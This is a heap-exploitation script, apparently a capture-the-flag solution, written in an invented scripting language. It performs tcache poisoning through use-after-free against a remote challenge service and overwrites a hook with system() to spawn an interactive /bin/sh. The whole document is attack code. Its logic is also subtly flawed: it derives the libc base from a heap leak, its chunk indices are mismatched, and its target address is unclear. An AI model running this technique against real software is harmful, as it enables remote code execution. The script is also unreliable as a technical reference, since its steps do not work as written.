# Tcache poisoning attack for heap exploitation
# Common in modern heap challenges with glibc 2.27+

let binary = "./heap_vuln"
let host = "pwn.chal.ctf"
let port = 9999

print("[*] Tcache Poisoning Exploit")
print("[*] Target:", host, ":", port)

let conn = connect(host, port)

# Menu-driven heap challenge functions
define function alloc(size, data)
    send(conn, "1")
    send(conn, str(size))
    send(conn, data)
end

define function free_chunk(idx)
    send(conn, "2")
    send(conn, str(idx))
end

define function view(idx)
    send(conn, "3")
    send(conn, str(idx))
    return recv_until(conn, "\n")
end

# Step 1: Allocate chunks to fill tcache
print("[+] Step 1: Filling tcache...")
for i in range(7)
    alloc(0x80, "CHUNK_" + str(i))
end

# Step 2: Free chunks to populate tcache
print("[+] Step 2: Populating tcache bins...")
for i in range(7)
    free_chunk(i)
end

# Step 3: Leak heap address via UAF
print("[+] Step 3: Leaking heap address...")
let leak_data = view(0)  # View freed chunk
let heap_leak = u64(leak_data)
print("    Heap leak:", hex(heap_leak))

# Step 4: Tcache poisoning - overwrite fd pointer
print("[+] Step 4: Poisoning tcache fd pointer...")

# Analyze binary to get dynamic target address
let elf = analyze(binary)
let target_addr = elf.symbols.target  # Or use GOT/PLT entry dynamically

# Allocate chunk, free it, then use UAF to poison fd
alloc(0x80, "VICTIM")
free_chunk(7)

# Overwrite fd pointer in freed chunk to point to target
# This requires a vulnerability like UAF or overflow
let poison_payload = p64(target_addr)
# Assuming edit function exists (vulnerability)
send(conn, "4")  # Edit menu option
send(conn, "7")
send(conn, poison_payload)

# Step 5: Allocate twice to get chunk at target_addr
print("[+] Step 5: Allocating to arbitrary address...")
alloc(0x80, "FILL")  # First alloc returns normal chunk
alloc(0x80, "/bin/sh\x00")  # Second alloc returns target_addr

# Step 6: Trigger exploitation
# If we wrote to __free_hook, next free() will call our address
print("[+] Step 6: Triggering exploit...")

# Calculate libc addresses dynamically
# Assume heap_leak contains a libc pointer (adjust based on actual leak type)
let libc_template = Libc("ubuntu20.04")
# Note: In real exploit, determine what function was leaked from heap
# For demo purposes, showing dynamic calculation pattern
let libc_base = heap_leak & 0xfffffffffffff000  # Align to page
let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
let system = libc_resolved.symbols.system
let payload = p64(system)

send(conn, "4")
send(conn, "8")
send(conn, payload)

# Free chunk with /bin/sh to trigger system("/bin/sh")
free_chunk(9)

print("[+] Shell should spawn!")
interactive(conn)
